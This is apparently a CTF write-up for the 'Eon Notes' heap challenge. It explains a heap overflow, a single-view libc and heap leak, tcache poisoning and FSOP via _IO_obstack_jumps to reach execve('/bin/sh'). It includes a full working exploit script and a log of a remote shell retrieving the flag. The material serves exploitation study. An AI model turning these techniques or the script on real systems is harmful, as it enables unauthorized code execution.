@@ -1,0 +1,826 @@
+---
+title: 'Qualification ARA 7.0 - Eon Notes'
+description: 'One-shot leak, heap overflow, tcache poisoning, and FSOP with _IO_obstack_jumps.'
+date: 2026-03-17
+category: 'qualification-ara-7-0'
+discipline: 'binary-exploitation'
+authors: ['abdieeuh']
+draft: false
+---
+
+> Note: I solved this challenge with LLM
+
+# EON-NOTES - One View Only, But the Heap Still Gives a Way In
+
+## Intro
+
+The main gimmick of this challenge is simple and very effective: you are only allowed to **view a note once** per run.
+
+That sounds like a small gameplay restriction, but in a pwn challenge it changes the whole mindset:
+
+- the leak has to be one-shot and complete
+- the exploit has to work without repeated probing
+- and because input is read through `scanf("%s")`, the payload cannot contain whitespace bytes
+
+That combination turns a normal heap challenge into something much more deliberate. You do not get many chances, so your first leak has to bring back both libc and heap information, and the rest of the chain has to be ready immediately.
+
+The remote target during the event was:
+
+```bash
+nc chall-ctf.ara-its.id 2001
+```
+
+The recorded event flag was:
+
+```text
+ARA7{7h1s_l3v3l_1s_nu7s_bro_4_s1ngl3_4773mp7_c4n_74k3_20_m1nu73s_jus7_for_m3_7o_chok3_10_m1l1s3conds_1n7o_cl1ck1ng_4n_orb_7oo_34rly}
+```
+
+## Recon: dist Contents and Protections
+
+The provided archive was straightforward: source, binary, loader, and libc.
+
+```bash
+$ unzip -l eon-notes.zip
+Archive:  eon-notes.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+     2051  2026-01-30 00:46   main.c
+    16744  2026-01-30 02:25   main
+  6622960  2026-01-27 15:48   libc.so.6
+   240936  2026-01-27 15:48   ld-linux-x86-64.so.2
+---------                     -------
+  6882691                     4 files
+```
+
+The binary protections were exactly what you would expect from a challenge that wants a real heap exploit:
+
+```bash
+$ checksec --file=unpack/main
+[*] '/home/abdieeuh/ara7/pwn/eon_notes/unpack/main'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+And the bundled libc was modern:
+
+```bash
+$ strings -a unpack/libc.so.6 | rg -m 1 'GNU C Library'
+GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.10) stable release version 2.35.
+```
+
+That immediately gives the practical direction:
+
+- Full RELRO blocks the easy GOT overwrite path.
+- Canary, NX, and PIE make stack-only shortcuts unattractive.
+- Modern glibc means old hooks are not the cleanest target anymore.
+
+So the realistic route is:
+
+```text
+heap corruption -> libc leak -> heap leak -> FSOP / ROP
+```
+
+## Recon: Reading the Source, Two Bugs Appear Immediately
+
+The source reveals the challenge very quickly.
+
+In `add_note()`, the title input is limited, but the content input is not:
+
+```c
+notes[noteCount] = malloc(size);
+printf("Input title: ");
+scanf("%15s", notes[noteCount]);
+getchar();
+printf("Input content: ");
+scanf("%s", notes[noteCount] + 16);   // unbounded
+getchar();
+noteCount++;
+```
+
+That gives a heap overflow.
+
+Then in `delete_note()`, the chunk is freed but the pointer is left behind:
+
+```c
+free(notes[index]);
+```
+
+That gives a dangling pointer and makes reuse predictable.
+
+Finally, the challenge gimmick is enforced in `view_note()`:
+
+```c
+if (!view) { error(); return; }
+view = 0;
+printf("Title: %s\n", notes[index]);
+printf("Content: %s\n", notes[index] + 16);
+```
+
+So the vulnerability summary is:
+
+1. heap overflow through `scanf("%s", notes[i] + 16)`
+2. dangling pointer after `free(notes[idx])`
+3. only one usable view per run, so the leak has to be complete
+
+## Recon: Function Addresses, PIE Notes, and ASM to Pseudocode
+
+Because the binary is PIE, all runtime addresses are `pie_base + offset`. The relevant function offsets are:
+
+```bash
+$ nm -n unpack/main | egrep ' add_note$| view_note$| delete_note$| main$| menu$| error$'
+0000000000001269 T menu
+00000000000012a5 T error
+00000000000012bf T add_note
+0000000000001441 T view_note
+0000000000001569 T delete_note
+0000000000001628 T main
+```
+
+The key assembly sequence in `add_note()` is the one that shifts the pointer by `0x10` and then calls `scanf("%s")`:
+
+```asm
+13d9: lea    rdx,[rax*8+0x0]
+13e1: lea    rax,[rip+0x2c78]        # notes
+13e8: mov    rax,QWORD PTR [rdx+rax*1]
+13ec: add    rax,0x10
+13f0: mov    rsi,rax
+13fd: mov    eax,0x0
+1402: call   __isoc99_scanf@plt
+```
+
+The simplified pseudocode is:
+
+```text
+add_note():
+  size = atoi(fgets(buf, 8, stdin))
+  if size <= 0xa0 or size > 0x4a0:
+    error()
+    return
+
+  p = malloc(size)
+  notes[noteCount] = p
+
+  scanf("%15s", p)          # title
+  getchar()
+  scanf("%s", p + 0x10)     # unbounded content write
+  getchar()
+
+  noteCount += 1
+```
+
+And `delete_note()` is effectively:
+
+```text
+delete_note():
+  idx = atoi(...)
+  free(notes[idx])          # pointer remains stored
+```
+
+That is enough to understand the exploitation surface without needing to single-step everything.
+
+## Constraint That Matters More Than It Looks: `scanf("%s")`
+
+The exploit input goes through `scanf("%s")`, which stops at whitespace. That means the payload cannot contain:
+
+```text
+09 0a 0b 0c 0d 20
+```
+
+In practice, this matters a lot:
+
+- pointer values with bad bytes can break the exploit
+- a partially written structure can crash in confusing ways
+- ASLR layouts with unlucky bytes sometimes need to be retried
+
+That is why the archived exploit checks candidate addresses and simply retries when a critical value contains a whitespace byte.
+
+This is one of those constraints that looks annoying at first and then becomes a major part of exploit reliability.
+
+## Important Twist: COPY Relocations for Standard Streams
+
+A very easy wrong turn here is to think:
+
+```text
+heap exploit -> poison chunk -> overwrite stdout pointer -> FSOP
+```
+
+But `readelf -r` shows COPY relocations for `stdout`, `stdin`, and `stderr`:
+
+```bash
+$ readelf -r unpack/main | egrep 'R_X86_64_COPY\s+.*(stdout|stdin|stderr)'
+000000004020  000f00000005 R_X86_64_COPY     0000000000004020 stdout@GLIBC_2.2.5 + 0
+000000004030  001100000005 R_X86_64_COPY     0000000000004030 stdin@GLIBC_2.2.5 + 0
+000000004040  001200000005 R_X86_64_COPY     0000000000004040 stderr@GLIBC_2.2.5 + 0
+```
+
+So the exported `stdout` symbol is copied into the binary’s `.bss`. Overwriting a libc symbol reference is not enough if the program actually uses the copied object.
+
+The clean solution is:
+
+- do not target the `stdout` symbol
+- target the real `_IO_2_1_stdout_` object in libc
+
+That is the object the archived exploit finally patches.
+
+## One View Only: The Leak Must Return libc and Heap Together
+
+Because `view_note()` only works once, the exploit has to recover both:
+
+- libc base
+- heap base information
+
+from a single leak.
+
+The archived solution does that with a largebin setup:
+
+1. fill the tcache for size `0x400`
+2. free another chunk of the same size so it bypasses tcache
+3. force it into unsorted and then largebin
+4. `view()` that chunk once
+
+Why this works:
+
+- largebin metadata gives libc-linked pointers through `fd/bk`
+- additional chunk-linked fields leak a heap pointer
+
+The libc calculation used in the archived notes was:
+
+```text
+libc_base = leak_fd - 0x21B0D0
+```
+
+That comes from:
+
+```text
+main_arena = 0x21ac80
+main_arena + 0x450 = 0x21b0d0
+```
+
+So the one-shot leak is enough to defeat:
+
+- ASLR for libc
+- safe-linking for tcache poisoning
+
+## From Heap Overflow to Tcache Poisoning
+
+Once the heap leak is available, safe-linking can be handled correctly:
+
+```text
+mangled_next = target ^ (chunk_addr >> 12)
+```
+
+That lets the exploit poison the tcache freelist so a later allocation lands on a chosen libc object.
+
+The final target is:
+
+```text
+_IO_2_1_stdout_   = libc_base + 0x21b780
+_IO_obstack_jumps = libc_base + 0x2173c0
+setcontext        = libc_base + 0x0539e0
+execve            = libc_base + 0x0eb080
+"/bin/sh"         = libc_base + 0x1d8678
+```
+
+The saved symbol output confirms those offsets:
+
+```bash
+$ readelf -sW unpack/libc.so.6 | egrep '(_IO_2_1_stdout_|_IO_stdfile_1_lock|_IO_obstack_jumps|execve@@|setcontext@@)' | head
+   340: 00000000000539e0   352 FUNC    WEAK   DEFAULT   15 setcontext@@GLIBC_2.2.5
+   620: 000000000021b780   224 OBJECT  GLOBAL DEFAULT   34 _IO_2_1_stdout_@@GLIBC_2.2.5
+  1975: 00000000000eb080    37 FUNC    WEAK   DEFAULT   15 execve@@GLIBC_2.2.5
+   906: 000000000021ca70    16 OBJECT  LOCAL  DEFAULT   35 _IO_stdfile_1_lock
+  5098: 00000000002173c0   168 OBJECT  LOCAL  DEFAULT   29 _IO_obstack_jumps
+```
+
+and:
+
+```bash
+$ strings -at x unpack/libc.so.6 | rg -m 1 '/bin/sh'
+ 1d8678 /bin/sh
+```
+
+## Why FSOP Works Here
+
+The challenge uses `puts("")` at the end of the loop, which is a very convenient trigger.
+
+The relevant logic is:
+
+```text
+puts(str):
+  fp = *stdout
+  if fp->_IO_write_ptr >= fp->_IO_write_end:
+      __overflow(fp, '\n')
+```
+
+Then:
+
+```text
+__overflow(fp, c):
+  return fp->vtable->overflow(fp, c)
+```
+
+The exploit sets the vtable to `_IO_obstack_jumps`, so the flow becomes:
+
+```text
+puts("") -> __overflow -> _IO_obstack_overflow -> _obstack_newchunk
+```
+
+Inside `_obstack_newchunk`, a function pointer can be invoked:
+
+```text
+ob->chunkfun(ob->extra_arg, size)
+```
+
+That function pointer is set to:
+
+```text
+setcontext
+```
+
+and `extra_arg` is set to a fake `ucontext`.
+
+So the full hijack becomes:
+
+```text
+puts("") -> _IO_obstack_overflow -> _obstack_newchunk -> setcontext(fake_ucontext) -> execve("/bin/sh", ...)
+```
+
+That is a very elegant modern FSOP path.
+
+## Fake `ucontext` Layout
+
+For glibc 2.35 on x86_64, the important offsets used in the archived exploit were:
+
+```text
+ucontext + 0x68  = RDI
+ucontext + 0x70  = RSI
+ucontext + 0x88  = RDX
+ucontext + 0xA0  = RSP
+ucontext + 0xA8  = RIP
+ucontext + 0xE0  = fpregs pointer
+ucontext + 0x1C0 = MXCSR
+ucontext + 0x128 = sigmask
+```
+
+The exploit fills those fields so that after `setcontext` restores state, execution continues at:
+
+```text
+execve("/bin/sh", argv, envp)
+```
+
+## Solver Flow
+
+The archived `exploit.py` followed this exact sequence:
+
+1. perform a one-shot largebin leak for libc and heap
+2. use the heap leak to beat safe-linking
+3. poison the tcache freelist
+4. land an allocation on `_IO_2_1_stdout_`
+5. patch the FILE object and swap its vtable to `_IO_obstack_jumps`
+6. place the obstack structure, fake `ucontext`, and argument vectors nearby in libc data
+7. let the program call `puts("")`
+8. reach `setcontext`
+9. pivot into `execve("/bin/sh", ...)`
+
+The archived usage examples were:
+
+```bash
+# local
+python3 exploit.py
+
+# remote interactive shell
+REMOTE=1 python3 exploit.py
+
+# remote and print flag directly
+REMOTE=1 AUTOFLAG=1 LOG=error python3 exploit.py
+
+# remote with a custom command
+REMOTE=1 CMD='id; ls -la; exit' LOG=error python3 exploit.py
+```
+
+## Exploit Script
+
+I attached the archived exploit as [exploit.py](./exploit.py). The full script is included below.
+
+```python
+#!/usr/bin/env python3
+from __future__ import annotations
+
+import os
+from pwn import *
+
+context.update(arch="amd64", os="linux")
+
+BIN_PATH = "./unpack/main"
+LD_PATH = "./unpack/ld-linux-x86-64.so.2"
+
+HOST = "chall-ctf.ara-its.id"
+PORT = 2001
+
+# scanf("%s") stops on these bytes (isspace):
+BAD = {0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20}
+
+
+def has_bad_bytes(x: int) -> bool:
+    return any(b in BAD for b in p64(x))
+
+
+def start(local: bool) -> tube:
+    if local:
+        # Run with the provided loader+libc so offsets match remote.
+        return process([LD_PATH, "--library-path", "./unpack", BIN_PATH], stdin=PIPE, stdout=PIPE)
+    return remote(HOST, PORT)
+
+
+def ru_strict(io: tube, token: bytes, timeout: float = 1.0) -> bytes:
+    data = io.recvuntil(token, timeout=timeout)
+    if not data.endswith(token):
+        raise TimeoutError(f"timeout waiting for {token!r}")
+    return data
+
+
+def menu_choice(io: tube, c: int) -> None:
+    ru_strict(io, b">> ")
+    io.sendline(str(c).encode())
+
+
+def add(io: tube, size: int, title: bytes, content: bytes) -> None:
+    """
+    Adds a note:
+      - title: scanf("%15s") into notes[i]
+      - content: scanf("%s") into notes[i] + 16 (UNBOUNDED)
+
+    Both scanf conversions stop at whitespace, so content/title must not contain bytes in BAD.
+    """
+    if len(title) > 15:
+        raise ValueError("title too long (max 15 bytes)")
+    if any(b in BAD for b in title) or any(b in BAD for b in content):
+        raise ValueError("payload contains whitespace byte (scanf would truncate)")
+
+    menu_choice(io, 1)
+    ru_strict(io, b"Note length: ")
+    io.sendline(str(size).encode())
+    # Don't wait for the next prompts: later exploitation steps intentionally corrupt stdout,
+    # and waiting for printed prompts would deadlock our script.
+    io.send(title + b"\n" + content + b"\n")
+
+
+def delete(io: tube, idx: int) -> None:
+    menu_choice(io, 3)
+    ru_strict(io, b"Index: ")
+    io.sendline(str(idx).encode())
+
+
+def view_once(io: tube, idx: int) -> tuple[bytes, bytes]:
+    """
+    View is allowed once per run.
+    We parse with delimiters because leaks can include arbitrary bytes (including newlines).
+    """
+    menu_choice(io, 2)
+    ru_strict(io, b"Index: ")
+    io.sendline(str(idx).encode())
+
+    ru_strict(io, b"Title: ")
+    title_blob = io.recvuntil(b"\nContent: ", drop=True, timeout=1.0)
+    content_blob = io.recvuntil(b"\n\n==== EON-NOTES ====", drop=True, timeout=1.0)
+    return title_blob, content_blob
+
+
+def u64_leak(blob: bytes) -> int:
+    # printf("%s") truncates at NUL; pad with zeros.
+    return u64(blob.ljust(8, b"\x00"))
+
+
+def leak_libc_and_heap(io: tube) -> tuple[int, int]:
+    """
+    Leak:
+      - libc: from largebin fd pointer (main_arena+0x450)
+      - heap: from largebin fd_nextsize pointer (chunk self-pointer)
+    """
+    # Allocate 9 chunks of the same size (request 0x3f0 => chunk size 0x400).
+    for i in range(9):
+        add(io, 0x3F0, f"T{i}".encode(), b"C" * 0x20)
+
+    # Fill tcache[0x400] with 7 frees.
+    for i in range(7):
+        delete(io, i)
+
+    # This free bypasses tcache (bin full) -> unsorted.
+    delete(io, 7)
+
+    # Trigger sorting unsorted -> largebin by requesting a larger chunk.
+    add(io, 0x4A0, b"BIG", b"D" * 0x20)
+
+    title_blob, content_blob = view_once(io, 7)
+    leak_fd = u64_leak(title_blob)
+    leak_heap = u64_leak(content_blob[:8])
+
+    # In provided libc: largebin fd == libc_base + 0x21B0D0 (main_arena+0x450).
+    libc_base = leak_fd - 0x21B0D0
+    return libc_base, leak_heap
+
+
+def exploit_once(io: tube) -> bool:
+    libc_base, heap_leak = leak_libc_and_heap(io)
+
+    # chunk7 header is the largebin fd_nextsize self-pointer leak.
+    chunk7_hdr = heap_leak
+
+    # ------------------------------------
+    # Plan: patch _IO_2_1_stdout_ in libc
+    # ------------------------------------
+    # The main binary has COPY relocs for stdout/stderr/stdin, so overwriting libc's exported
+    # `stdout` pointer is ineffective. Instead, we:
+    #   1) tcache-poison an allocation to land on `_IO_2_1_stdout_`
+    #   2) overwrite its vtable to `_IO_obstack_jumps`
+    #   3) write an obstack pointer at fp+0xe0 (right after the FILE+vtable)
+    #   4) place obstack+ucontext in nearby libc .data
+    #   5) let the program's `puts(\"\")` call trigger setcontext->execve
+
+    # note10 -> chunk5 (B), note11 -> chunk4 (A). They are contiguous (A before B).
+    add(io, 0x3F0, b"B", b"X" * 0x20)
+    add(io, 0x3F0, b"A", b"Y" * 0x20)
+
+    # Free B then A so tcache list becomes: A -> B -> ...
+    delete(io, 10)
+    delete(io, 11)
+
+    # -----------------------------
+    # Poison tcache to allocate at _IO_2_1_stdout_
+    # -----------------------------
+    stdout_obj = libc_base + 0x21B780  # _IO_2_1_stdout_ (aligned)
+    lock_obj = libc_base + 0x21CA70    # _IO_stdfile_1_lock
+    vtable_obstack = libc_base + 0x2173C0
+    setcontext = libc_base + 0x539E0
+    execve = libc_base + 0xEB080
+    binsh = libc_base + 0x1D8678
+
+    if any(has_bad_bytes(x) for x in [stdout_obj, lock_obj, vtable_obstack, setcontext, execve, binsh]):
+        return False
+
+    log.info("leak: chunk7_hdr=%#x, libc_base=%#x", chunk7_hdr, libc_base)
+    log.info("targets: stdout=%#x, setcontext=%#x, execve=%#x, /bin/sh=%#x", stdout_obj, setcontext, execve, binsh)
+
+    # chunk5 user pointer (two chunks before chunk7)
+    chunk5_user = (chunk7_hdr - 0x800) + 0x10
+
+    # Poison B->next (chunk5) to point to stdout_obj.
+    mangled = stdout_obj ^ (chunk5_user >> 12)
+    if any(b in BAD for b in p64(mangled)):
+        return False
+
+    overflow = b"A" * 0x3E0
+    overflow += p64(0x400) + p64(0x401)
+    overflow += p64(mangled) + p64(0)
+    if any(b in BAD for b in overflow):
+        return False
+
+    # note12 allocates A back and overwrites freed B->next.
+    add(io, 0x3F0, b"OVR", overflow)
+    # note13 returns B and primes tcache head to stdout_obj.
+    add(io, 0x3F0, b"PRM", b"Z" * 0x10)
+
+    # note14 should now be allocated at stdout_obj.
+    title = b"\x00" * 15  # clear _flags + first pointer (avoid 0x8000 path)
+
+    # Build a single big content blob that:
+    #   - patches stdout FILE fields (write_ptr/end, lock, mode, vtable)
+    #   - writes fp+0xe0 obstack pointer
+    #   - places obstack + ucontext + fpstate + argv/envp in libc .data (right after stdout)
+    def build_stdout_big_payload() -> bytes:
+        # We place our aux structs after stdout_obj to avoid heap pointers.
+        # Content starts at stdout_obj+0x10, so offsets below are from FILE base.
+        blob = bytearray(b"\x00" * 0x600)
+
+        def w64(off_from_base: int, val: int) -> None:
+            blob[off_from_base - 0x10:off_from_base - 0x10 + 8] = p64(val)
+
+        def w32(off_from_base: int, val: int) -> None:
+            blob[off_from_base - 0x10:off_from_base - 0x10 + 4] = p32(val)
+
+        def w64_addr(addr: int, val: int) -> None:
+            off = addr - (stdout_obj + 0x10)
+            blob[off:off + 8] = p64(val)
+
+        probe = os.getenv("PROBE") == "1"
+        write_fn = libc_base + 0x114870
+        exit_fn = libc_base + 0xEAC00
+        if probe and any(has_bad_bytes(x) for x in [write_fn, exit_fn]):
+            raise ValueError("bad byte in probe function pointer")
+
+        # Try a few candidate placements to dodge BAD bytes.
+        candidates = []
+        for ob_add in range(0x200, 0x320, 0x10):
+            ob = stdout_obj + ob_add
+            uctx = ob + 0x80
+            fpu = uctx + 0x200
+            argv = fpu + 0x40
+            envp = argv + 0x20
+            # SysV ABI wants RSP%16==8 at function entry (after CALL pushes return address).
+            # We enter execve via RET, so pick an address that already satisfies %16==8.
+            stack_top = envp + 0x48
+            msg = stdout_obj + 0x560
+            if stack_top + 0x20 >= stdout_obj + 0x600:
+                continue
+            if any(has_bad_bytes(x) for x in [ob, uctx, fpu, argv, envp, stack_top, msg]):
+                continue
+            candidates.append((ob, uctx, fpu, argv, envp, stack_top, msg))
+
+        for ob, uctx, fpu, argv, envp, stack_top, msg in candidates:
+            blob[:] = b"\x00" * len(blob)
+
+            # Make newline go to __overflow.
+            for buf in [stdout_obj, stdout_obj + 0x10, stdout_obj + 0x30, stdout_obj + 0x50]:
+                if has_bad_bytes(buf):
+                    continue
+                w64(0x28, buf)
+                w64(0x30, buf)
+                break
+            else:
+                continue
+
+            w64(0x88, lock_obj)
+            w32(0xC0, 0)
+            w64(0xD8, vtable_obstack)
+            w64(0xE0, ob)  # fp+0xe0 => obstack*
+
+            # obstack minimal
+            ob_off = ob - stdout_obj
+            w64(ob_off + 0x18, 0)  # next_free
+            w64(ob_off + 0x20, 0)  # chunk_limit
+            w32(ob_off + 0x30, 0x10)
+            w64(ob_off + 0x38, setcontext)
+            w64(ob_off + 0x48, uctx)
+            blob[ob_off + 0x50 - 0x10] = 1
+
+            # argv/envp
+            argv_off = argv - stdout_obj
+            envp_off = envp - stdout_obj
+            w64(argv_off + 0x00, binsh)
+            w64(argv_off + 0x08, 0)
+            w64(envp_off + 0x00, 0)
+
+            # ucontext
+            u_off = uctx - stdout_obj
+            if probe:
+                # write(1, "OK\\n", 3) then return to _exit.
+                w64(u_off + 0x68, 1)       # rdi
+                w64(u_off + 0x70, msg)     # rsi
+                w64(u_off + 0x88, 3)       # rdx
+                w64(u_off + 0xA0, stack_top)
+                w64(u_off + 0xA8, write_fn)
+                w64_addr(stack_top, exit_fn)  # return address for write()
+                blob[msg - (stdout_obj + 0x10): msg - (stdout_obj + 0x10) + 3] = b"OK\n"
+            else:
+                w64(u_off + 0x68, binsh)
+                w64(u_off + 0x70, argv)
+                w64(u_off + 0x88, envp)
+                w64(u_off + 0xA0, stack_top)
+                w64(u_off + 0xA8, execve)
+            w64(u_off + 0xE0, fpu)
+            w32(u_off + 0x1C0, 0x1F80)
+
+            # fpstate header for fldenv (first 0x1c bytes)
+            fpu_off = fpu - stdout_obj
+            fpu_env = bytearray(b"\x00" * 0x1C)
+            fpu_env[0:2] = p16(0x037F)
+            fpu_env[2:4] = p16(0x0000)
+            # FXSAVE-style FTW is not a 0xFFFF tag word; keep it zeroed.
+            fpu_env[4:6] = p16(0x0000)
+            # Put a sane MXCSR in the saved area too (setcontext also loads it separately).
+            fpu_env[24:28] = p32(0x1F80)
+            blob[fpu_off - 0x10:fpu_off - 0x10 + 0x1C] = bytes(fpu_env)
+
+            if any(b in BAD for b in blob):
+                continue
+            return bytes(blob)
+
+        raise ValueError("no stdout big payload without BAD bytes")
+
+    content = build_stdout_big_payload()
+    add(io, 0x3F0, title, content)
+    return True
+
+
+def main() -> None:
+    context.log_level = os.getenv("LOG", "info")
+    local = os.getenv("REMOTE") is None
+    cmd = os.getenv("CMD")
+    if os.getenv("AUTOFLAG") == "1" and not cmd:
+        cmd = "ls -la; cat flag_*.txt; exit"
+
+    while True:
+        io = start(local=local)
+        try:
+            if not exploit_once(io):
+                io.close()
+                continue
+
+            # If exploit succeeded, we should already be in /bin/sh after the implicit puts("").
+            io.sendline(b"echo PWNED; id; uname -a")
+            out = io.recvrepeat(0.7)
+            if b"PWNED" not in out:
+                io.close()
+                continue
+
+            print(out.decode(errors="replace"))
+            if cmd:
+                io.sendline(cmd.encode())
+                out2 = io.recvrepeat(1.0)
+                print(out2.decode(errors="replace"))
+                io.close()
+                return
+
+            io.interactive()
+            return
+        except (EOFError, PwnlibException, TimeoutError, ValueError):
+            io.close()
+            continue
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Archived Remote Proof
+
+The saved remote run from the archived notes was:
+
+```bash
+$ REMOTE=1 AUTOFLAG=1 LOG=error python3 exploit.py
+Input title: PWNED
+uid=1000(user) gid=1000(user) groups=1000(user)
+Linux 1fdb6f25cd86 6.8.0-90-generic #91-Ubuntu SMP PREEMPT_DYNAMIC Tue Nov 18 14:14:30 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+
+total 32
+dr-xr-xr-x 1 root root  4096 Feb  6 08:16 .
+drwxr-xr-x 1 root root  4096 Feb  6 08:16 ..
+-r-xr-xr-x 1 root root   133 Feb  3 12:58 flag_v9hGncvDeBtA4XDr27wVy8cFd0K6qnTTlWOKiOIy.txt
+-r-xr-xr-x 1 root root 16744 Feb  3 12:58 main
+ARA7{7h1s_l3v3l_1s_nu7s_bro_4_s1ngl3_4773mp7_c4n_74k3_20_m1nu73s_jus7_for_m3_7o_chok3_10_m1l1s3conds_1n7o_cl1ck1ng_4n_orb_7oo_34rly}
+```
+
+So the final result is not just a crash or a local proof-of-concept. The archived exploit clearly reached command execution and retrieved the real flag from the remote runtime.
+
+## Getting the Flag
+
+The complete exploit chain was:
+
+1. use the unbounded `scanf("%s")` as a heap overflow
+2. use the dangling pointer from `free()` to make heap reuse predictable
+3. spend the single view on a largebin chunk so both libc and heap leak at once
+4. compute libc base and recover enough heap information to undo safe-linking
+5. poison the tcache freelist
+6. reallocate onto `_IO_2_1_stdout_`
+7. patch the FILE object and redirect the vtable to `_IO_obstack_jumps`
+8. prepare an obstack and fake `ucontext`
+9. use `puts("")` as the trigger
+10. pivot through `setcontext` into `execve("/bin/sh", ...)`
+11. run the archived auto-flag command and read the flag
+
+Final recorded flag:
+
+```text
+ARA7{7h1s_l3v3l_1s_nu7s_bro_4_s1ngl3_4773mp7_c4n_74k3_20_m1nu73s_jus7_for_m3_7o_chok3_10_m1l1s3conds_1n7o_cl1ck1ng_4n_orb_7oo_34rly}
+```
+
+## Key Takeaways
+
+- A “single view” restriction is not just cosmetic. It changes exploit design by forcing a complete one-shot leak.
+- Modern glibc mitigations do not kill heap exploitation, but they do force better planning. Safe-linking means you need a real heap leak before poisoning.
+- COPY relocations matter. Overwriting the wrong `stdout` target can make an exploit look correct in theory while still failing at runtime.
+- When older hooks are no longer convenient, FSOP through modern callback-capable paths like obstack remains a strong option.
+
+## Final Thoughts
+
+What makes this challenge memorable is not the overflow by itself. That part is familiar. The interesting part is how the constraints force discipline:
+
+1. one leak only
+2. no whitespace in payload-critical bytes
+3. no lazy GOT tricks
+4. modern libc behavior
+
+That combination makes the challenge feel much sharper than a normal heap warmup.
+
+If you want to practice from this writeup, the best follow-up exercises are:
+
+1. rerun the exploit with verbose logging and watch how retries happen because of whitespace bad bytes
+2. use a probe mode first, then swap in the final `execve` path
+3. inspect the COPY relocations and the FILE object layout yourself so the FSOP path feels natural rather than magical
+
+## References
+
+- [glibc Malloc Internals](https://sourceware.org/glibc/wiki/MallocInternals)
+- [how2heap](https://github.com/shellphish/how2heap)
+- [CTF Wiki: tcache and safe-linking](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache/)
+- [glibc 2.35 `obstack.c`](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/obstack.c)
+- [glibc x86_64 `setcontext` implementation](https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/unix/sysv/linux/x86_64/setcontext.S)
+- [`execve(2)` manual](https://man7.org/linux/man-pages/man2/execve.2.html)
+- [Copy Relocations Explained](https://maskray.me/blog/2021-04-25-copy-relocations)
